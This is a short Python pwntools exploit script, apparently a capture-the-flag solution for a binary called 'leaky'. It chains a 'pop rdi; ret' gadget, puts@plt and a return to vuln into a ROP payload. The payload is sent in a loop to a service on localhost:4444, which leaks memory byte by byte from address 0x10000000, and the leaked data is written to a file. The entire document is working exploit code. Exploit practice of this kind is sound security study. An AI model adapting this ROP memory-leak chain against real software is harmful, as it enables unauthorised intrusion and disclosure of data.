from pwn import *
import re

context.terminal = ["termite","-e"]

elf = ELF("./leaky")
rop = ROP(elf)


flag_check = b''

pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]

counter = 0

def leak_index(i):
	global flag_check
	global counter
	payload = p64(0x10000000 + i) + p64(elf.plt['puts']) + p64(elf.symbols['vuln']) + b'D' * (8) + b'E' * (8) + p64(pop_rdi)
	print(payload)
	p = remote("localhost", 4444)
	# p = elf.process()
	p.recvuntil("What's the flag? ")
	p.sendline(payload)
	p.recvuntil('\n')
	data = b''
	if True: #
		data = 	p.recvuntil('\n', drop=True).replace(b"That's wrong :(",b"")
	else:
		pass
	flag_check += data + b'\0'
	print(data)
	counter += len(data) + 1
	p.close()

while counter <= 2048:
	leak_index(counter)
	print(chr(27) + "[2J")
	print(flag_check)

open("flag_check_reverse.o","wb").write(flag_check)

# print(p.recvall())
